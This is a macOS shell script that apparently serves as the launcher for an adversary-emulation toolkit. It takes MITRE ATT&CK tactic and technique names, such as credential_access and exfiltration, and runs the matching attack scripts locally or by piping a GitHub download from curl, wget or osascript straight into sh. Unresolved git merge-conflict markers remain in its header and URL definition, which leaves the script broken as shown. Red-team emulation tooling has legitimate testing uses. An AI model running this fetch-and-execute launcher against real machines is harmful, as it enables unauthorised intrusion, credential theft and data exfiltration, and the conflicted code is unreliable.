#!/bin/sh
# Name: attackmacos.sh
# Platform: macOS
# Author: @darmado | x.com/darmad0
# Version: 1.3
# Created: 2023-09-30
# License: Apache 2.0
<<<<<<< HEAD
=======
# Repository: https://github.com/armadoinc/attack-macOS
>>>>>>> c6f83ff (cleanup work)
# Description: Tool to fetch and execute scripts from the attack-macOS repository
# Dependencies: curl, wget, osascript (optional)

# Exit on error and undefined vars
set -eu

# Ensure cleanup on exit
trap cleanup EXIT INT TERM

cleanup() {
    # Reset terminal
    [ -t 1 ] && tput sgr0
    return 0
}

# Configuration
#------------------------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
<<<<<<< HEAD
GIT_URL="https://raw.githubusercontent.com/armadoinc/attack-macOS/main/ttp/{tactic}/shell/{ttp}.sh"
=======
GIT_URL="https://raw.githubusercontent.com/armadoinc/attack-macOS/main/attackmacos/ttp/{tactic}/{ttp}/{ttp}.sh"
>>>>>>> c6f83ff (cleanup work)
DEFAULT_METHOD="curl"
VERBOSE="${ATTACKMACOS_VERBOSE:-false}"
LOG_ENABLED="${ATTACKMACOS_LOG:-false}"

# Execution methods
METHOD_LOCAL="local"
METHOD_CURL="curl"
METHOD_WGET="wget"
METHOD_OSASCRIPT="osascript"

# MITRE ATT&CK Tactics
TACTICS="reconnaissance resource_development initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection command_and_control exfiltration impact"

# Exit codes
E_SUCCESS=0
E_FAILURE=1 # General failure
E_INVALID_ARGS=2 # Invalid arguments to the script
E_MISSING_DEPS=3 # Missing dependencies
E_INVALID_TACTIC=4 # Invalid tactic
E_INVALID_TTP=5 # Invalid TTP or TTP script not found/accessible
E_EXECUTION_FAILED=6 # TTP script execution failed

# Detect available shell
detect_shell() {
    for shell in bash zsh sh ash dash; do
        if command -v "$shell" >/dev/null 2>&1; then
            echo "$shell"
            return 0
        fi
    done
    echo "sh"  # Fallback to sh if no other shell found
    return 0
}

# Execute script with detected shell
execute_script() {
    script="$1"
    shift
    shell="$(detect_shell)"
    "$shell" "$script" "$@"
}

#------------------------------------------------------------------------------
# Display Functions
#------------------------------------------------------------------------------

# Display help
display_help() {
    cat << EOF
Usage: $(basename "$0") [--method <method>] --tactic <Tactic> --ttp <TTP> [--args <arguments>]

Methods:
  curl                   Use curl to download the script (default)
  wget                   Use wget to download the script
  osascript             Use AppleScript to download the script
  local                 Execute the script locally

Required:
  --tactic <Tactic>     Specify the tactic
  --ttp <TTP>          Specify the TTP

Optional:
  --method <method>     Specify the method (default: curl)
  --args <arguments>    Specify arguments for the TTP script
  --banner             Display the ASCII art banner
  --list-local         List locally available TTPs for a tactic (use with --tactic)
  --list-remote        List remotely available TTPs for a tactic (use with --tactic)
  -h, --help           Display this help message

Examples:
  $(basename "$0") --method local --tactic discovery --ttp browser_history --args='-s'
  $(basename "$0") --list-local --tactic discovery
  $(basename "$0") --list-remote --tactic discovery
EOF
}

# Display banner
display_banner() {
    cat << "EOF"

                                  █████████████████
                  ███████████████████████████████████████████████
                 █            █████████████████████████          █
                ██               ███████████████████             ██
                ██                ████████████████              ██
                ██                 █████   ██████                ██
                 █                                               █
                 █                                               █
                ███     █                                 █     ███
                ████   █████                          ██████   ████
               ██████  ████████                    █████████  ██████
               ██████   ███████████            ███████████   ██████
               ██████    ████████████        █████████████    ██████
              ██████      ████████████      █████████████     ██████
               ██████      ██████████        ███████████     ██████
            ██████                                             ███████
              ███  ████                ████               ████   ██
             ███  █████                ██               ██████   ███
          ██  ██ ███ █████                            ██████ █████  █
              ██  ████ ████████                    ████████ ████  ██
              █████ ██ ████████████████████████████████████  ██ █ ███
                ████      ███████████████████████████████      ███
                 █           █████████████████████████          █
                                 ████████████████

                         A  t  t  a  c  k  m  a  c  O  S

EOF
}

#------------------------------------------------------------------------------
# Utility Functions
#------------------------------------------------------------------------------

# Log message with timestamp and level
log_message() {
    [ "$LOG_ENABLED" = "false" ] && return 0
    local level="$1"
    local message="$2"
    printf "[%s] [%s] %s\\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$message" >&2
}

# Silent output handler with logging
output() {
    local level="$1"
    local message="$2"
    local return_code="${3:-0}"
    
    log_message "$level" "$message"
    [ "$level" = "error" ] && printf "Error: %s\\n" "$message" >&2 && return "${return_code:-$E_FAILURE}"
    [ "$VERBOSE" = "true" ] && printf "%s\\n" "$message"
    return 0
}

# Check required dependencies
check_dependencies() {
    local missing=false
    local deps=()
    
    case "$1" in
        "$METHOD_CURL") deps+=("curl") ;;
        "$METHOD_WGET") deps+=("wget") ;;
        "$METHOD_OSASCRIPT") deps+=("osascript") ;;
    esac
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            output "error" "Missing required dependency: $dep" "$E_MISSING_DEPS"
            missing=true
        fi
    done
    
    [ "$missing" = "true" ] && return "$E_MISSING_DEPS"
    return 0
}

# Validate input string is not empty and contains no dangerous characters
validate_input() {
    input="$1"
    name="$2"
    
    [ -z "$input" ] && {
        output "error" "$name cannot be empty" "$E_INVALID_ARGS"
        return "$E_INVALID_ARGS"
    }
    
    case "$input" in
        *[\;\|\&\$\(\)\{\}\[\]\<\>\`]*)
            output "error" "Invalid characters in $name: $input" "$E_INVALID_ARGS"
            return "$E_INVALID_ARGS"
            ;;
    esac
    return "$E_SUCCESS"
}

# Check if tactic exists
validate_tactic() {
    tactic="$1"
    echo "$TACTICS" | grep -q -w "$tactic" || {
        output "error" "Invalid tactic: $tactic. Valid tactics are: $TACTICS" "$E_INVALID_TACTIC"
        return "$E_INVALID_TACTIC"
    }
    return "$E_SUCCESS"
}

# Validate TTP exists
validate_ttp() {
    local tactic="$1"
    local ttp="$2"
    local base_path="$SCRIPT_DIR/ttp/$tactic"
    
    [ -f "$base_path/$ttp.sh" ] && return 0
    [ -f "$base_path/$ttp/$ttp.sh" ] && return 0
    # This function is primarily for local validation, remote validation is done during execution.
    output "error" "Local TTP script not found: $ttp for tactic: $tactic" "$E_INVALID_TTP"
    return "$E_INVALID_TTP"
}

# Get available TTPs for a tactic (local files only)
get_local_ttps() {
    tactic="$1"
    base_dir="$SCRIPT_DIR/ttp/$tactic"
    
    [ ! -d "$base_dir" ] && return 1

    # Find all .sh files in the tactic directory
    find "$base_dir" -name "*.sh" -type f 2>/dev/null | while read -r script_path; do
        # Extract the script name without extension
        script_name=$(basename "$script_path" .sh)
        echo "$script_name"
    done | sort -u
}

# Get available TTPs from remote repository
get_remote_ttps() {
    tactic="$1"
    if ! command -v curl >/dev/null 2>&1; then
        output "error" "curl is required for listing remote TTPs." "$E_MISSING_DEPS"
        return "$E_MISSING_DEPS"
    fi
    # Note: This HTML scraping method is fragile and may break if GitHub changes its page structure.
    # Future improvement could involve using the GitHub API, potentially with jq.
    curl -sSL -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
        "https://github.com/armadoinc/attack-macOS/tree/main/attackmacos/ttp/$tactic" 2>/dev/null | \
    grep -o '{"name":"[^"]*","path":"attackmacos/ttp/'$tactic'/[^"]*","contentType":"directory"}' | \
    grep -o '"name":"[^"]*"' | \
    sed 's/"name":"//;s/"//' | \
    sort -u || {
        output "error" "Failed to fetch remote TTPs for $tactic" "$E_FAILURE" # Or a more specific error
        return "$E_FAILURE"
    }
}

#------------------------------------------------------------------------------
# Core Functions
#------------------------------------------------------------------------------

# Execute local TTP
execute_local() {
    tactic="$1"
    ttp="$2"
    args="$3"
    base_path="$SCRIPT_DIR/ttp/$tactic"
    
    validate_input "$tactic" "tactic" || return "$?"
    validate_input "$ttp" "TTP" || return "$?"
    [ -n "$args" ] && validate_input "$args" "arguments" || return "$?"

    script_path=""
    exact_ttp_sh="$base_path/$ttp/$ttp.sh"
    exact_sh="$base_path/$ttp.sh"
    main_in_dir="$base_path/$ttp/main.sh"
    ttp_in_dir="$base_path/$ttp/${ttp}.sh" # In case ttp name matches a file in its own dir

    if [ -f "$exact_ttp_sh" ]; then
        script_path="$exact_ttp_sh"
    elif [ -f "$exact_sh" ]; then
        script_path="$exact_sh"
    elif [ -d "$base_path/$ttp" ]; then
        if [ -f "$main_in_dir" ]; then
            script_path="$main_in_dir"
        elif [ -f "$ttp_in_dir" ]; then # Check this after specific main.sh
            script_path="$ttp_in_dir"
        fi
    fi

    [ -z "$script_path" ] && {
        output "error" "Script for TTP '$ttp' not found in expected locations for tactic '$tactic'." "$E_INVALID_TTP"
        return "$E_INVALID_TTP"
    }
    
    # Ensure the script is executable
    if [ ! -x "$script_path" ]; then
        output "warning" "Script '$script_path' is not executable. Attempting to chmod +x."
        chmod +x "$script_path" || {
            output "error" "Failed to make script '$script_path' executable." "$E_EXECUTION_FAILED"
            return "$E_EXECUTION_FAILED"
        }
    fi

    cd "$(dirname "$script_path")" 2>/dev/null || {
        output "error" "Failed to change directory to $(dirname "$script_path")" "$E_EXECUTION_FAILED"
        return "$E_EXECUTION_FAILED"
    }
    
    execute_script "$(basename "$script_path")" "$args"
}

# Execute remote TTP via curl
execute_curl() {
    tactic="$1"
    ttp="$2"
    args="$3"
    local url # Declare url local to the function
    
    validate_input "$tactic" "tactic" || return "$?"
    validate_input "$ttp" "TTP" || return "$?"
    [ -n "$args" ] && validate_input "$args" "arguments" || return "$?"

    local ttp_name="${ttp%.sh}"
    local temp_url="${GIT_URL//\{tactic\}/$tactic}"
    url="${temp_url//\{ttp\}/$ttp_name}"
    
    # Dependency already checked by check_dependencies in main

    if ! curl -IsSL "$url" | head -n 1 | grep -q "200 OK"; then
        output "error" "Remote TTP script at $url not found or not accessible (HTTP status not 200)." "$E_INVALID_TTP"
        return "$E_INVALID_TTP"
    fi
    
    # Download and execute the script
    curl -sSL "$url" | sh -s -- "$args"
}

# Execute remote TTP via wget
execute_wget() {
    tactic="$1"
    ttp="$2"
    args="$3"
    local url # Declare url local to the function
    
    validate_input "$tactic" "tactic" || return "$?"
    validate_input "$ttp" "TTP" || return "$?"
    [ -n "$args" ] && validate_input "$args" "arguments" || return "$?"

    local ttp_name="${ttp%.sh}"
    local temp_url="${GIT_URL//\{tactic\}/$tactic}"
    url="${temp_url//\{ttp\}/$ttp_name}"

    # Dependency already checked by check_dependencies in main

    # Use wget --spider for validation if available, otherwise proceed carefully
    # Note: wget --spider might return 0 even for 404 on some versions/sites, so this is not as reliable as curl -Is head.
    # However, a direct download attempt will fail anyway if not found.
    # For simplicity, we'll rely on wget's own error handling for the download.
    # A more robust check would involve checking wget's exit code after attempting to download to a temp file.
    if ! wget --spider -q "$url" 2>/dev/null; then
        # Fallback or more verbose check if spider failed or isn't reliable
        if ! wget -qS --tries=1 --timeout=5 "$url" -O /dev/null 2>&1 | grep -q "HTTP.* 200 OK"; then
             output "error" "Remote TTP script at $url not found or not accessible via wget." "$E_INVALID_TTP"
             return "$E_INVALID_TTP"
        fi
    fi

    # Download and execute the script
    wget -qO- "$url" | sh -s -- "$args"
}

# Execute remote TTP via osascript
execute_osascript() {
    tactic="$1"
    ttp="$2"
    args="$3"
    local url # Declare url local to the function
    
    validate_input "$tactic" "tactic" || return "$?"
    validate_input "$ttp" "TTP" || return "$?"
    [ -n "$args" ] && validate_input "$args" "arguments" || return "$?"

    local ttp_name="${ttp%.sh}"
    local temp_url="${GIT_URL//\{tactic\}/$tactic}"
    url="${temp_url//\{ttp\}/$ttp_name}"

    # Dependencies (osascript, curl) already checked by check_dependencies in main

    # Validate URL using curl within the osascript context (less direct feedback)
    # This is tricky because osascript -e "do shell script" has limitations.
    # A simpler approach is to let the inner curl handle it, and if it fails, sh -s will get empty input.
    # For a more robust check here, one might need a temporary file.
    # Given the context, we'll primarily rely on the curl inside the osascript.
    # We can add a preliminary check using host system's curl for faster failure.
    if ! curl -IsSL "$url" | head -n 1 | grep -q "200 OK"; then
        output "error" "Remote TTP script at $url not found or not accessible (pre-check)." "$E_INVALID_TTP"
        return "$E_INVALID_TTP"
    fi
    
    # Download and execute the script using osascript
    # The actual execution relies on curl being available in the 'do shell script' environment
    osascript -e "do shell script \"curl -sSL '$url' | sh -s -- '$args'\""
}

# Execute TTP with specified method
execute_ttp() {
    method="$1"
    tactic="$2"
    ttp="$3"
    args="$4"
    
    validate_tactic "$tactic" || return "$?" # validate_tactic now returns proper exit code
    
    # Call dependency check here, only once.
    check_dependencies "$method" || return "$?"

    local exit_code
    case "$method" in
        "$METHOD_LOCAL"|"local")     execute_local "$tactic" "$ttp" "$args"; exit_code=$? ;;
        "$METHOD_CURL"|"curl")      execute_curl "$tactic" "$ttp" "$args"; exit_code=$? ;;
        "$METHOD_WGET"|"wget")      execute_wget "$tactic" "$ttp" "$args"; exit_code=$? ;;
        "$METHOD_OSASCRIPT"|"osascript") execute_osascript "$tactic" "$ttp" "$args"; exit_code=$? ;;
        *)
            output "error" "Invalid method: $method. Valid methods: local, curl, wget, osascript" "$E_INVALID_ARGS"
            return "$E_INVALID_ARGS"
            ;;
    esac
    
    return "$exit_code"
}

# List available TTPs
list_ttps() {
    local tactic="$1"
    local list_type="$2"
    local ttps
    
    if [ -n "$tactic" ]; then
        validate_tactic "$tactic" || return "$?" # Uses new exit code
        
        if [ "$list_type" = "local" ]; then
            ttps=$(get_local_ttps "$tactic")
            if [ -z "$ttps" ]; then # Check if ttps is empty
                output "warning" "No local TTPs found for tactic: $tactic" "$E_SUCCESS" # Not an error to find nothing
                return "$E_SUCCESS"
            fi
            echo "Locally available TTPs for $tactic:"
        elif [ "$list_type" = "remote" ]; then
            # get_remote_ttps now checks for curl and returns specific error code
            ttps=$(get_remote_ttps "$tactic") || return "$?"
            if [ -z "$ttps" ]; then # Check if ttps is empty
                output "warning" "No remote TTPs found for tactic: $tactic, or failed to fetch." "$E_SUCCESS" # Not an error if list is empty post-fetch
                return "$E_SUCCESS"
            fi
            echo "Remotely available TTPs for $tactic:"
        fi
        
        printf "%s\n" "$ttps" | sed 's/^/- /'
    else
        echo "Available TTPs by tactic ($list_type):"
        for t in $TACTICS; do
            echo
            echo "$t:"
            if [ "$list_type" = "local" ]; then
                ttps=$(get_local_ttps "$t")
            elif [ "$list_type" = "remote" ]; then
                # If get_remote_ttps fails for a tactic here (e.g. curl missing, network issue),
                # we'll print its error and continue to the next tactic.
                get_remote_ttps "$t" || continue # Check curl dep per tactic
                ttps=$(get_remote_ttps "$t")
            fi
            if [ -n "$ttps" ]; then
                printf "%s\n" "$ttps" | sed 's/^/  /'
            else
                echo "  (No TTPs found for this tactic)"
            fi
        done
    fi
    return "$E_SUCCESS"
}

#------------------------------------------------------------------------------
# Main Execution
#------------------------------------------------------------------------------

main() {
    local method="$DEFAULT_METHOD"
    local tactic=""
    local ttp=""
    local args=""
    local show_banner=false
    local list_mode=false
    local list_type=""

    # Parse arguments
    while [ $# -gt 0 ]; do
        case "$1" in
            --method=*)
                method="${1#*=}"
                shift
                ;;
            --method)
                [ $# -lt 2 ] && { output "error" "Missing value for --method argument" "$E_INVALID_ARGS"; return "$E_INVALID_ARGS"; }
                method="$2"
                shift 2
                ;;
            --tactic=*)
                tactic="${1#*=}"
                shift
                ;;
            --tactic)
                [ $# -lt 2 ] && { output "error" "Missing value for --tactic argument" "$E_INVALID_ARGS"; return "$E_INVALID_ARGS"; }
                tactic="$2"
                shift 2
                ;;
            --ttp=*)
                ttp="${1#*=}"
                shift
                ;;
            --ttp)
                [ $# -lt 2 ] && { output "error" "Missing value for --ttp argument" "$E_INVALID_ARGS"; return "$E_INVALID_ARGS"; }
                ttp="$2"
                shift 2
                ;;
            --args=*)
                args="${1#*=}"
                shift
                ;;
            --args)
                 # Args can be empty, so we check if $2 exists but not if it's empty itself.
                 # However, if --args is specified, it expects a value.
                [ $# -lt 2 ] && { output "error" "Missing value for --args argument (use '' for empty)" "$E_INVALID_ARGS"; return "$E_INVALID_ARGS"; }
                args="$2"
                shift 2
                ;;
            --banner)
                show_banner=true
                shift
                ;;
            --list-local)
                list_mode=true
                list_type="local"
                shift
                ;;
            --list-remote)
                list_mode=true
                list_type="remote"
                shift
                ;;
            -h|--help)
                display_help
                return "$E_SUCCESS"
                ;;
            *)
                output "error" "Unknown option: $1" "$E_INVALID_ARGS"
                display_help
                return "$E_INVALID_ARGS"
                ;;
        esac
    done

    # Validate method (already done in execute_ttp, but good for early exit if invalid)
    case "$method" in
        "$METHOD_LOCAL"|"local"|"$METHOD_CURL"|"curl"|"$METHOD_WGET"|"wget"|"$METHOD_OSASCRIPT"|"osascript")
            ;; # Valid method
        *)
            output "error" "Invalid method specified: $method" "$E_INVALID_ARGS"
            echo "Valid methods: local, curl, wget, osascript" >&2
            return "$E_INVALID_ARGS"
            ;;
    esac

    # Show banner if requested
    [ "$show_banner" = true ] && display_banner

    # Handle list mode
    if [ "$list_mode" = true ]; then
        list_ttps "$tactic" "$list_type"
        return "$?" # list_ttps now returns proper exit codes
    fi

    # Validate required arguments for execution
    if [ -z "$tactic" ] || [ -z "$ttp" ]; then
        output "error" "Both --tactic and --ttp are required for execution." "$E_INVALID_ARGS"
        display_help # Show help because core arguments are missing
        return "$E_INVALID_ARGS"
    fi

    # NOTE: Initial dependency check for the chosen method is now inside execute_ttp.
    # This is because execute_ttp is the central point that knows the method.

    # Execute TTP
    execute_ttp "$method" "$tactic" "$ttp" "$args"
    local exit_status=$?

    if [ "$exit_status" -ne "$E_SUCCESS" ]; then
        output "error" "TTP execution failed with exit code: $exit_status" "$exit_status"
    else
        output "info" "TTP execution completed successfully." "$E_SUCCESS"
    fi
    return "$exit_status"
}

# Execute main function with all arguments
main "$@" # Pass all script arguments to main
exit $? # Exit with the status code from main
